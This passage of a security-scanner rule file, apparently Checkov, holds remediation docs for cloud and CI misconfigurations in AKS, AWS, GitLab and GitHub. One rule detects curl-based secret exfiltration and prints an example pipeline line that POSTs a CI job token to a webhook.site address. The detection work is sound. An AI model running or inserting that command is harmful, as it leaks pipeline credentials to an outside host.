    <key>CKV_AZURE_6</key>
    <name>Ensure AKS API server defines authorized IP ranges</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aks-api-server-does-not-define-authorized-ip-ranges"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aks-api-server-does-not-define-authorized-ip-ranges"></div>AKS API server does not define authorized IP ranges </div><a aria-label="Skip link to AKS API server does not define authorized IP ranges " class="heading-anchor-icon fa fa-anchor" href="#aks-api-server-does-not-define-authorized-ip-ranges"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The AKS API server receives requests to perform actions in the cluster , for example, to create resources, and scale the number of nodes. The API server provides a secure way to manage a cluster. </p>
<p>To enhance cluster security and minimize attacks, the API server should only be accessible from a limited set of IP address ranges. These IP ranges allow defined IP address ranges to communicate with the API server. A request made to the API server from an IP address that is not part of these authorized IP ranges is blocked.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>When you specify a CIDR range, start with the first IP address in the range. </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">az aks create \
    --resource-group myResourceGroup \
    --name myAKSCluster \
    --node-count 1 \
    --vm-set-type VirtualMachineScaleSets \
    --load-balancer-sku standard \
    --api-server-authorized-ip-ranges 73.140.245.0/24 \
    --generate-ssh-keys
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_kubernetes_cluster</li>
<li><strong>Argument</strong>: api_server_authorized_ip_ranges (Optional)<br/>
The IP ranges to whitelist for incoming traffic to the masters.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_kubernetes_cluster" "example" {
  ...
+   api_server_authorized_ip_ranges = '192.168.0.0/16'
  ...
}

output "client_certificate" {
  value = azurerm_kubernetes_cluster.example.kube_config.0.client_certificate
}

output "kube_config" {
  value = azurerm_kubernetes_cluster.example.kube_config_raw
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-templates"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-templates"></div>ARM Templates</div><a aria-label="Skip link to ARM Templates" class="heading-anchor-icon fa fa-anchor" href="#arm-templates"></a></h2>
<ul>
<li><strong>Resource</strong>: Microsoft.ContainerService/managedClusters</li>
<li><strong>Argument</strong>: apiServerAuthorizedIPRanges</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{
  "name": "string",
  "type": "Microsoft.ContainerService/managedClusters",
  "apiVersion": "2019-06-01",
  "location": "string",
  "tags": {},
  "properties": {
    "kubernetesVersion": "string",
    "dnsPrefix": "string",
    "agentPoolProfiles": [
      {
        "count": "integer",
        "vmSize": "string",
        "osDiskSizeGB": "integer",
        "vnetSubnetID": "string",
        "maxPods": "integer",
        "osType": "string",
        "maxCount": "integer",
        "minCount": "integer",
        "enableAutoScaling": "boolean",
        "type": "string",
        "orchestratorVersion": "string",
        "availabilityZones": [
          "string"
        ],
        "enableNodePublicIP": "boolean",
        "scaleSetPriority": "string",
        "scaleSetEvictionPolicy": "string",
        "nodeTaints": [
          "string"
        ],
        "name": "string"
      }
    ],
    "linuxProfile": {
      "adminUsername": "string",
      "ssh": {
        "publicKeys": [
          {
            "keyData": "string"
          }
        ]
      }
    },
    "windowsProfile": {
      "adminUsername": "string",
      "adminPassword": "string"
    },
    "servicePrincipalProfile": {
      "clientId": "string",
      "secret": "string"
    },
    "addonProfiles": {},
    "nodeResourceGroup": "string",
    "enableRBAC": "boolean",
    "enablePodSecurityPolicy": "boolean",
    "networkProfile": {
      "networkPlugin": "string",
      "networkPolicy": "string",
      "podCidr": "string",
      "serviceCidr": "string",
      "dnsServiceIP": "string",
      "dockerBridgeCidr": "string",
      "loadBalancerSku": "string"
    },
    "aadProfile": {
      "clientAppID": "string",
      "serverAppID": "string",
      "serverAppSecret": "string",
      "tenantID": "string"
    },
 +  "apiServerAuthorizedIPRanges": [
      "string"
    ]
  },
  "identity": {
    "type": "string"
  },
  "resources": []
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_kubernetes_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_7</key>
    <name>Ensure AKS cluster network policies are enforced</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aks-cluster-network-policies-are-not-enforced"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aks-cluster-network-policies-are-not-enforced"></div>AKS cluster network policies are not enforced</div><a aria-label="Skip link to AKS cluster network policies are not enforced" class="heading-anchor-icon fa fa-anchor" href="#aks-cluster-network-policies-are-not-enforced"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Network policy options in AKS include two ways to implement a network policy. You can choose between Azure Network Policies or Calico Network Policies. In both cases, the underlying controlling layer is based on Linux IPTables to enforce the specified policies. Policies are translated into sets of allowed and disallowed IP pairs. These pairs are then programmed as IPTable rules.</p>
<p>The principle of least privilege should be applied to how traffic can flow between pods in an AKS cluster. We recommend you select a preferred network policy framework and enforce granular usage-based policies on the architecture and business logic of you applications.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_kubernetes_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_237</key>
    <name>Ensure AWS API GATEWAY enables Create before Destroy</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-api-gateway-does-not-enable-create-before-destroy"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-api-gateway-does-not-enable-create-before-destroy"></div>AWS API Gateway does not enable Create before Destroy</div><a aria-label="Skip link to AWS API Gateway does not enable Create before Destroy" class="heading-anchor-icon fa fa-anchor" href="#aws-api-gateway-does-not-enable-create-before-destroy"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is recommended to enable create_before_destroy argument inside the resource lifecycle configuration block to avoid a possible outage when the API Gateway needs to be recreated during an update.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p>CloudFormation creates a new API Gateway first and then will delete the old one automatically.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_api_gateway_rest_api" "example" {
  name = "example"

+ lifecycle {
+   create_before_destroy = true
+ }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-enables-create-before-destroy' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-enables-create-before-destroy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-enables-create-before-destroy' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GLB_4</key>
    <name>Ensure GitLab projects commits are signed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-project-commits-are-not-signed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gitlab-project-commits-are-not-signed"></div>Gitlab project commits are not signed</div><a aria-label="Skip link to Gitlab project commits are not signed" class="heading-anchor-icon fa fa-anchor" href="#gitlab-project-commits-are-not-signed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitLab, administrators can turn on the capability to require signed commits for a project. When you enable required commit signing on a branch, contributors and bots can only push commits that have been signed and verified to the branch. If a collaborator pushes an unsigned commit to a branch that requires commit signatures, the collaborator will need to rebase the commit to include a verified signature, then force push the rewritten commit to the branch.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: gitlab_project</li>
<li>Attribute: prevent_secrets</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "gitlab_project" "example-two" {
...
  push_rules {
    ...
+    reject_unsigned_commits        = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gitlab-commits-are-signed' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gitlab-commits-are-signed</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gitlab-commits-are-signed' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_8</key>
    <name>Ensure Kubernetes dashboard is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes-dashboard-is-not-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes-dashboard-is-not-disabled"></div>Kubernetes dashboard is not disabled</div><a aria-label="Skip link to Kubernetes dashboard is not disabled" class="heading-anchor-icon fa fa-anchor" href="#kubernetes-dashboard-is-not-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Terraform provider for Azure provides the capability to disable the Kubernetes dashboard on an AKS cluster. This is achieved by providing the Kubernetes dashboard as an AKS add-on like the Azure Monitor for containers integration, AKS virtual nodes, or HTTP application routing. The dashboard add-on is disabled by default for all new clusters created on Kubernetes 1.18 or greater.</p>
<p>In mid-2019 Tesla was hacked and their Kubernetes dashboard was open to the internet. Hackers browsed around and found credentials, eventually managing to deploy pods running bitcoin mining software. </p>
<p>We recommend you disable the Kubernetes dashboard to prevent the need to manage its individual access interface, eliminating it as an attack vector.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az aks disable-addons -g myRG -n myAKScluster -a kube-dashboard 
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_kubernetes_cluster</li>
<li><strong>Argument</strong>: kube_dashboard (required): Is the Kubernetes Dashboard enabled?</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">...
  addon_profile {
    kube_dashboard {
      enabled = false
    }
  }
...
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-templates"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-templates"></div>ARM Templates</div><a aria-label="Skip link to ARM Templates" class="heading-anchor-icon fa fa-anchor" href="#arm-templates"></a></h2>
<ul>
<li><strong>Resource</strong>: Microsoft.ContainerService/managedClusters</li>
<li><strong>Argument</strong>: kubeDashboard</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">...
        "addonProfiles": {
          "kubeDashboard": {
            "enabled": false
          }
        },
...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_kubernetes_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_kubernetes_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_6</key>
    <name>Ensure GitHub Actions artifact build has SBOM attestation in pipeline</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-actions-artifact-build-do-not-have-sbom-attestation-in-pipeline"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-actions-artifact-build-do-not-have-sbom-attestation-in-pipeline"></div>GitHub Actions artifact build do not have SBOM attestation in pipeline</div><a aria-label="Skip link to GitHub Actions artifact build do not have SBOM attestation in pipeline" class="heading-anchor-icon fa fa-anchor" href="#github-actions-artifact-build-do-not-have-sbom-attestation-in-pipeline"></a></h1>
<p>Cosign can be used to sign pipeline artifacts to ensure their integrity and prevent tampering prior to and after deployment. Signing SBOMs ensures that no changes were made to an application between the code and deploy phases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<p>Add <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">cosign sign</code> to sign SBOMs. There are many ways to do this as a job or step in a GitHub Actions pipeline. Below is one example for signing an SBOM.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">+ run: cosign attest --predicate sbom.json --type https://cyclonedx.org/bom --key env://COSIGN_PRIVATE_KEY ${{ env.IMAGE }}
</code></pre>
<p>OR</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">+ run: cosign sign --key cosign.key container:sha256-1234.sbom
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/found-artifact-build-without-evidence-of-cosign-sbom-attestation-in-pipeline' target='_blank'> https://docs.bridgecrew.io/docs/found-artifact-build-without-evidence-of-cosign-sbom-attestation-in-pipeline</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/found-artifact-build-without-evidence-of-cosign-sbom-attestation-in-pipeline' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_7</key>
    <name>Ensure GitHub Actions does not contain workflow_dispatch inputs parameters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-actions-contain-workflow_dispatch-inputs-parameters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-actions-contain-workflow-dispatch-inputs-parameters"></div>GitHub Actions contain workflow_dispatch inputs parameters</div><a aria-label="Skip link to GitHub Actions contain workflow_dispatch inputs parameters" class="heading-anchor-icon fa fa-anchor" href="#github-actions-contain-workflow_dispatch-inputs-parameters"></a></h1>
<p>To maintain an untampered workflow, pipelines should be unaffected by user input. In GitHub Actions, workflow_dispatch allows you to manually trigger pipelines and enter unique inputs per run. While this may be helpful for running different scenarios, it breaks the policy that workflows should not use user input and should be automated.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">on: 
  workflow_dispatch:
-    inputs:
-        ...
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/the-build-output-cannot-be-affected-by-user-parameters-other-than-the-build-entry-point-and-the-top-level-source-location-github-actions-workflow_dispatch-inputs-must-be-empty' target='_blank'> https://docs.bridgecrew.io/docs/the-build-output-cannot-be-affected-by-user-parameters-other-than-the-build-entry-point-and-the-top-level-source-location-github-actions-workflow_dispatch-inputs-must-be-empty</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/the-build-output-cannot-be-affected-by-user-parameters-other-than-the-build-entry-point-and-the-top-level-source-location-github-actions-workflow_dispatch-inputs-must-be-empty' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_7</key>
    <name>Ensure GitHub repository webhooks use HTTPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-repository-webhooks-do-not-use-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-repository-webhooks-do-not-use-htt-ps"></div>GitHub repository webhooks do not use HTTPs</div><a aria-label="Skip link to GitHub repository webhooks do not use HTTPs" class="heading-anchor-icon fa fa-anchor" href="#github-repository-webhooks-do-not-use-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Webhooks can be configured to use endpoints of your choosing, including whether TLS is enabled or not. Ensure you are using a webhook endpoint with encryption by using a standard HTTPS URL.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_repository_webhook</li>
<li>Attribute: insecure_ssl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "github_repository_webhook" "foo" {
...
  configuration {
-    url          = "http://google.com/"
+    url          = "https://google.com/"
-    insecure_ssl = false
+    insecure_ssl = false
  }

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-organization-and-repository-webhooks-are-using-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITLABCI_1</key>
    <name>Suspicious use of curl with CI environment variables in script</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="suspicious-use-of-curl-with-ci-environment-variables-in-script"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-suspicious-use-of-curl-with-ci-environment-variables-in-script"></div>Suspicious use of curl with CI environment variables in script</div><a aria-label="Skip link to Suspicious use of curl with CI environment variables in script" class="heading-anchor-icon fa fa-anchor" href="#suspicious-use-of-curl-with-ci-environment-variables-in-script"></a></h1>
<p>Using curl with environment variables could be an attempt to exfiltrate secrets from a pipeline. Investigate if the use of curl is appropriate and secure.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<p>Block code and remove code that attempts to exfiltrate secrets.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">deploy:
-  script: 'curl -H \"Content-Type: application/json\" -X POST --data "$CI_JOB_JWT_V1" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826'
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-ci-environment-variables-in-script' target='_blank'> https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-ci-environment-variables-in-script</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-ci-environment-variables-in-script' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITLABCI_2</key>
    <name>Avoid creating rules that generate double pipelines</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rules-used-could-create-a-double-pipeline"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rules-used-could-create-a-double-pipeline"></div>Rules used could create a double pipeline</div><a aria-label="Skip link to Rules used could create a double pipeline" class="heading-anchor-icon fa fa-anchor" href="#rules-used-could-create-a-double-pipeline"></a></h1>
<p>The use of multiple trigger rules in a CI configuration file can lead to duplicate pipelines running. For example, if there is a trigger for every push and a trigger for merge request events, both triggers could be true and thus create two pipelines.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<p>Try to keep the number of trigger sources down to one</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">planOnlySubset:
  script: echo "This job creates double pipelines!"
  rules:
    - changes:
        - $DOCKERFILES_DIR/*
    - if: $CI_PIPELINE_SOURCE == "push"
-    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/avoid-creating-rules-that-generate-double-pipelines' target='_blank'> https://docs.bridgecrew.io/docs/avoid-creating-rules-that-generate-double-pipelines</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/avoid-creating-rules-that-generate-double-pipelines' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_252</key>
    <name>Ensure AWS CloudTrail defines an SNS Topic</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudtrail-does-not-define-an-sns-topic"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-trail-does-not-define-an-sns-topic"></div>AWS CloudTrail does not define an SNS Topic</div><a aria-label="Skip link to AWS CloudTrail does not define an SNS Topic" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudtrail-does-not-define-an-sns-topic"></a></h1>
